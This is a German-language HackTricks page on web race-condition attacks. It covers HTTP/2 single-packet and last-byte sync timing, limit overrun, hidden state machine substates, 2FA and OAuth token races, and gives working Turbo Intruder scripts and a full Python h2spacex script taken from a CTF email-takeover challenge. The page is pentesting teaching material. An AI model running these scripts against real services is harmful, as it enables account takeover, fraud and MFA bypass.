# Race Condition

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

{% hint style="warning" %}
Um ein tiefes Verst√§ndnis dieser Technik zu erlangen, √ºberpr√ºfen Sie den Originalbericht unter [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Verbesserung von Race Condition-Angriffen

Die gr√∂√üte H√ºrde bei der Ausnutzung von Race Conditions besteht darin, sicherzustellen, dass mehrere Anfragen gleichzeitig bearbeitet werden, mit **sehr geringem Unterschied in ihren Verarbeitungszeiten ‚Äì idealerweise weniger als 1 ms**.

Hier finden Sie einige Techniken zur Synchronisierung von Anfragen:

#### HTTP/2 Single-Packet-Angriff vs. HTTP/1.1 Last-Byte-Synchronisierung

* **HTTP/2**: Unterst√ºtzt das Senden von zwei Anfragen √ºber eine einzige TCP-Verbindung, wodurch die Auswirkungen von Netzwerk-Jitter verringert werden. Aufgrund serverseitiger Variationen k√∂nnen jedoch zwei Anfragen m√∂glicherweise nicht ausreichen, um einen konsistenten Race Condition-Angriff durchzuf√ºhren.
* **HTTP/1.1 'Last-Byte-Sync'**: Erm√∂glicht das Vorab-Senden der meisten Teile von 20-30 Anfragen, wobei ein kleines Fragment zur√ºckgehalten wird, das dann zusammen gesendet wird, um eine gleichzeitige Ankunft beim Server zu erreichen.

**Die Vorbereitung f√ºr Last-Byte-Sync** umfasst:

1. Senden von Headern und Bodendaten ohne das letzte Byte, ohne den Stream zu beenden.
2. Eine Pause von 100 ms nach dem ersten Senden.
3. Deaktivierung von TCP\_NODELAY, um Nagles Algorithmus f√ºr das Batchen der letzten Frames zu nutzen.
4. Pingen, um die Verbindung aufzuw√§rmen.

Das anschlie√üende Senden der zur√ºckgehaltenen Frames sollte zu ihrer Ankunft in einem einzigen Paket f√ºhren, was √ºber Wireshark √ºberpr√ºfbar ist. Diese Methode gilt nicht f√ºr statische Dateien, die typischerweise nicht in RC-Angriffen involviert sind.

### Anpassung an die Serverarchitektur

Das Verst√§ndnis der Architektur des Ziels ist entscheidend. Front-End-Server k√∂nnten Anfragen unterschiedlich weiterleiten, was die Zeitmessung beeinflusst. Eine pr√§ventive serverseitige Verbindungserw√§rmung durch unbedeutende Anfragen k√∂nnte die Anfragetiming normalisieren.

#### Umgang mit sitzungsbasiertem Locking

Frameworks wie PHPs Sitzungs-Handler serialisieren Anfragen nach Sitzung, was potenziell Schwachstellen verschleiern kann. Die Verwendung unterschiedlicher Sitzungstoken f√ºr jede Anfrage kann dieses Problem umgehen.

#### √úberwindung von Rate- oder Ressourcenlimits

Wenn die Verbindungserw√§rmung nicht effektiv ist, k√∂nnte das absichtliche Ausl√∂sen von Verz√∂gerungen durch die Rate- oder Ressourcenlimits von Webservern durch eine Flut von Dummy-Anfragen den Single-Packet-Angriff erleichtern, indem eine serverseitige Verz√∂gerung induziert wird, die f√ºr Race Conditions f√∂rderlich ist.

## Angriffsbeispiele

* **Tubo Intruder - HTTP2 Single-Packet-Angriff (1 Endpunkt)**: Sie k√∂nnen die Anfrage an **Turbo Intruder** senden (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), Sie k√∂nnen im Request den Wert √§ndern, den Sie f√ºr **`%s`** brute-forcen m√∂chten, wie in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`, und dann **`examples/race-single-packer-attack.py`** aus dem Dropdown ausw√§hlen:

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

Wenn Sie **verschiedene Werte senden** m√∂chten, k√∂nnten Sie den Code mit diesem √§ndern, der eine Wortliste aus der Zwischenablage verwendet:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Wenn das Web kein HTTP2 unterst√ºtzt (nur HTTP1.1), verwenden Sie `Engine.THREADED` oder `Engine.BURP` anstelle von `Engine.BURP2`.
{% endhint %}

* **Tubo Intruder - HTTP2 Einzelpaketangriff (Mehrere Endpunkte)**: Falls Sie eine Anfrage an 1 Endpunkt senden m√ºssen und dann mehrere an andere Endpunkte, um die RCE auszul√∂sen, k√∂nnen Sie das Skript `race-single-packet-attack.py` mit etwas wie folgendem √§ndern:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Es ist auch in **Repeater** √ºber die neue '**Send group in parallel**' Option in Burp Suite verf√ºgbar.
* F√ºr **limit-overrun** k√∂nnten Sie einfach die **gleiche Anfrage 50 Mal** in der Gruppe hinzuf√ºgen.
* F√ºr **connection warming** k√∂nnten Sie **am Anfang** der **Gruppe** einige **Anfragen** an einen nicht statischen Teil des Webservers **hinzuf√ºgen**.
* Um den Prozess **zwischen** der Verarbeitung **einer Anfrage und einer anderen** in 2 Subzust√§nden zu verz√∂gern, k√∂nnten Sie **zus√§tzliche Anfragen zwischen** beiden Anfragen **hinzuf√ºgen**.
* F√ºr eine **multi-endpoint** RC k√∂nnten Sie die **Anfrage** senden, die **in den versteckten Zustand** geht, und dann **50 Anfragen** direkt danach, die **den versteckten Zustand ausnutzen**.

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **Automatisiertes Python-Skript**: Das Ziel dieses Skripts ist es, die E-Mail eines Benutzers zu √§ndern, w√§hrend es kontinuierlich √ºberpr√ºft, bis der Best√§tigungstoken der neuen E-Mail an die letzte E-Mail ankommt (das liegt daran, dass im Code ein RC gesehen wurde, bei dem es m√∂glich war, eine E-Mail zu √§ndern, aber die Best√§tigung an die alte zu senden, weil die Variable, die die E-Mail angibt, bereits mit der ersten gef√ºllt war).\
Wenn das Wort "objetivo" in den empfangenen E-Mails gefunden wird, wissen wir, dass wir den Best√§tigungstoken der ge√§nderten E-Mail erhalten haben und beenden den Angriff.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Verbesserung des Single Packet Angriffs

In der urspr√ºnglichen Forschung wird erkl√§rt, dass dieser Angriff eine Grenze von 1.500 Bytes hat. In [**diesem Beitrag**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) wurde jedoch erkl√§rt, wie es m√∂glich ist, die 1.500-Byte-Beschr√§nkung des Single Packet Angriffs auf die **65.535 B Fensterbeschr√§nkung von TCP durch Verwendung von IP-Schichtfragmentierung** (Aufteilen eines einzelnen Pakets in mehrere IP-Pakete) zu erweitern und sie in unterschiedlicher Reihenfolge zu senden, was es erm√∂glichte, die Rekonstruktion des Pakets zu verhindern, bis alle Fragmente den Server erreicht hatten. Diese Technik erm√∂glichte es dem Forscher, 10.000 Anfragen in etwa 166 ms zu senden.&#x20;

Beachten Sie, dass diese Verbesserung den Angriff in RC, der Hunderte/Tausende von Paketen erfordert, um gleichzeitig anzukommen, zuverl√§ssiger macht, aber auch einige Softwarebeschr√§nkungen haben k√∂nnte. Einige beliebte HTTP-Server wie Apache, Nginx und Go haben eine strenge Einstellung `SETTINGS_MAX_CONCURRENT_STREAMS` von 100, 128 und 250. Andere wie NodeJS und nghttp2 haben sie jedoch unbegrenzt.\
Das bedeutet im Grunde, dass Apache nur 100 HTTP-Verbindungen von einer einzelnen TCP-Verbindung ber√ºcksichtigt (was diesen RC-Angriff einschr√§nkt).

Sie finden einige Beispiele, die diese Technik verwenden, im Repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Vor der vorherigen Forschung wurden einige Payloads verwendet, die einfach versuchten, die Pakete so schnell wie m√∂glich zu senden, um einen RC zu verursachen.

* **Repeater:** √úberpr√ºfen Sie die Beispiele aus dem vorherigen Abschnitt.
* **Intruder**: Senden Sie die **Anfrage** an **Intruder**, setzen Sie die **Anzahl der Threads** auf **30** im **Optionsmen√º** und w√§hlen Sie als Payload **Null-Payloads** und generieren Sie **30.**
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodologie**

### Limit-√úberlauf / TOCTOU

Dies ist die grundlegendste Art von Race Condition, bei der **Schwachstellen** auftreten, die **an Orten erscheinen**, die **die Anzahl der Male begrenzen, die Sie eine Aktion ausf√ºhren k√∂nnen**. Wie die Verwendung desselben Rabattcodes in einem Webshop mehrere Male. Ein sehr einfaches Beispiel finden Sie in [**diesem Bericht**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) oder in [**diesem Bug**](https://hackerone.com/reports/759247)**.**

Es gibt viele Variationen dieser Art von Angriff, einschlie√ülich:

* Einl√∂sen einer Geschenkkarte mehrere Male
* Bewerten eines Produkts mehrere Male
* Abheben oder √úberweisen von Bargeld √ºber Ihr Kontoguthaben hinaus
* Wiederverwendung einer einzelnen CAPTCHA-L√∂sung
* Umgehen einer Anti-Brute-Force-Ratebegrenzung

### **Verborgene Subzust√§nde**

Das Ausnutzen komplexer Race Conditions beinhaltet oft, kurze Gelegenheiten zu nutzen, um mit verborgenen oder **unbeabsichtigten Maschinen-Subzust√§nden** zu interagieren. So gehen Sie vor:

1. **Identifizieren Sie potenzielle verborgene Subzust√§nde**
* Beginnen Sie mit der Identifizierung von Endpunkten, die kritische Daten √§ndern oder mit ihnen interagieren, wie z. B. Benutzerprofile oder Passwortzur√ºcksetzprozesse. Konzentrieren Sie sich auf:
* **Speicherung**: Bevorzugen Sie Endpunkte, die serverseitige persistente Daten manipulieren, gegen√ºber denen, die Daten clientseitig verarbeiten.
* **Aktion**: Suchen Sie nach Operationen, die vorhandene Daten √§ndern, da diese eher ausnutzbare Bedingungen schaffen als solche, die neue Daten hinzuf√ºgen.
* **Schl√ºsselung**: Erfolgreiche Angriffe beinhalten normalerweise Operationen, die auf demselben Identifikator basieren, z. B. Benutzername oder R√ºcksetz-Token.
2. **Durchf√ºhren einer ersten Erkundung**
* Testen Sie die identifizierten Endpunkte mit Race Condition-Angriffen und beobachten Sie Abweichungen von den erwarteten Ergebnissen. Unerwartete Antworten oder √Ñnderungen im Anwendungsverhalten k√∂nnen auf eine Schwachstelle hinweisen.
3. **Demonstrieren Sie die Schwachstelle**
* Reduzieren Sie den Angriff auf die minimale Anzahl von Anfragen, die erforderlich sind, um die Schwachstelle auszunutzen, oft nur zwei. Dieser Schritt kann mehrere Versuche oder Automatisierung erfordern, aufgrund des pr√§zisen Timings.

### Zeitkritische Angriffe

Pr√§zision beim Timing von Anfragen kann Schwachstellen aufdecken, insbesondere wenn vorhersehbare Methoden wie Zeitstempel f√ºr Sicherheitstoken verwendet werden. Zum Beispiel k√∂nnte die Generierung von Passwortzur√ºcksetz-Token basierend auf Zeitstempeln identische Token f√ºr gleichzeitige Anfragen erm√∂glichen.

**Um auszunutzen:**

* Verwenden Sie pr√§zises Timing, wie einen einzelnen Paketangriff, um gleichzeitige Passwortzur√ºcksetz-Anfragen zu stellen. Identische Token weisen auf eine Schwachstelle hin.

**Beispiel:**

* Fordern Sie zwei Passwortzur√ºcksetz-Token gleichzeitig an und vergleichen Sie sie. √úbereinstimmende Token deuten auf einen Fehler in der Token-Generierung hin.

**√úberpr√ºfen Sie dies** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **um dies auszuprobieren.**

## Fallstudien zu verborgenen Subzust√§nden

### Bezahlen & einen Artikel hinzuf√ºgen

√úberpr√ºfen Sie dieses [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation), um zu sehen, wie Sie im Gesch√§ft **bezahlen** und einen zus√§tzlichen Artikel **hinzuf√ºgen**, f√ºr den Sie **nicht bezahlen m√ºssen**.

### Best√§tigen anderer E-Mails

Die Idee ist, **eine E-Mail-Adresse zu verifizieren und sie gleichzeitig in eine andere zu √§ndern**, um herauszufinden, ob die Plattform die neue ge√§nderte Adresse √ºberpr√ºft.

### √Ñndern der E-Mail in 2 E-Mail-Adressen Cookie-basiert

Laut [**dieser Forschung**](https://portswigger.net/research/smashing-the-state-machine) war Gitlab auf diese Weise anf√§llig f√ºr einen √úbernahmeangriff, da es **das E-Mail-Best√§tigungstoken einer E-Mail an die andere E-Mail senden k√∂nnte**.

**√úberpr√ºfen Sie dies** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **um dies auszuprobieren.**

### Verborgene Datenbankzust√§nde / Best√§tigungsumgehung

Wenn **2 verschiedene Schreibvorg√§nge** verwendet werden, um **Informationen** in eine **Datenbank** hinzuzuf√ºgen, gibt es einen kurzen Zeitraum, in dem **nur die ersten Daten in die Datenbank geschrieben wurden**. Zum Beispiel, wenn ein Benutzer erstellt wird, k√∂nnten der **Benutzername** und das **Passwort** **geschrieben** werden und **dann das Token**, um das neu erstellte Konto zu best√§tigen. Das bedeutet, dass f√ºr eine kurze Zeit das **Token zur Best√§tigung eines Kontos null ist**.

Daher k√∂nnte **die Registrierung eines Kontos und das Senden mehrerer Anfragen mit einem leeren Token** (`token=` oder `token[]=` oder jede andere Variation), um das Konto sofort zu best√§tigen, erm√∂glichen, ein **Konto zu best√§tigen**, bei dem Sie die E-Mail nicht kontrollieren.

**√úberpr√ºfen Sie dies** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **um dies auszuprobieren.**

### Umgehung von 2FA

Der folgende Pseudocode ist anf√§llig f√ºr Race Conditions, da in einem sehr kurzen Zeitraum **2FA nicht durchgesetzt wird**, w√§hrend die Sitzung erstellt wird:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 ewige Persistenz

Es gibt mehrere [**OAuth-Anbieter**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Diese Dienste erm√∂glichen es Ihnen, eine Anwendung zu erstellen und Benutzer zu authentifizieren, die der Anbieter registriert hat. Um dies zu tun, muss der **Client** Ihrer Anwendung **erlauben**, auf einige ihrer Daten innerhalb des **OAuth-Anbieters** zuzugreifen.\
Bis hierhin ist es nur ein gew√∂hnlicher Login mit Google/LinkedIn/GitHub..., bei dem Sie mit einer Seite konfrontiert werden, die sagt: "_Anwendung \<InsertCoolName> m√∂chte auf Ihre Informationen zugreifen, m√∂chten Sie das erlauben?_"

#### Race Condition im `authorization_code`

Das **Problem** tritt auf, wenn Sie **es akzeptieren** und automatisch einen **`authorization_code`** an die b√∂sartige Anwendung senden. Dann **missbraucht diese Anwendung eine Race Condition im OAuth-Dienstanbieter, um mehr als ein AT/RT** (_Authentication Token/Refresh Token_) aus dem **`authorization_code`** f√ºr Ihr Konto zu generieren. Grunds√§tzlich wird sie ausnutzen, dass Sie die Anwendung akzeptiert haben, um auf Ihre Daten zuzugreifen, um **mehrere Konten zu erstellen**. Wenn Sie dann **aufh√∂ren, der Anwendung den Zugriff auf Ihre Daten zu erlauben, wird ein Paar von AT/RT gel√∂scht, aber die anderen bleiben weiterhin g√ºltig**.

#### Race Condition im `Refresh Token`

Sobald Sie **ein g√ºltiges RT erhalten haben**, k√∂nnten Sie versuchen, **es auszunutzen, um mehrere AT/RT zu generieren**, und **selbst wenn der Benutzer die Berechtigungen** f√ºr die b√∂sartige Anwendung zum Zugriff auf seine Daten **widerruft, werden mehrere RTs weiterhin g√ºltig sein.**

## **RC in WebSockets**

In [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) finden Sie einen PoC in Java, um Websocket-Nachrichten **parallel** zu senden, um **Race Conditions auch in Web Sockets** auszunutzen.

## Referenzen

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
* [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie heute Zugang:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}
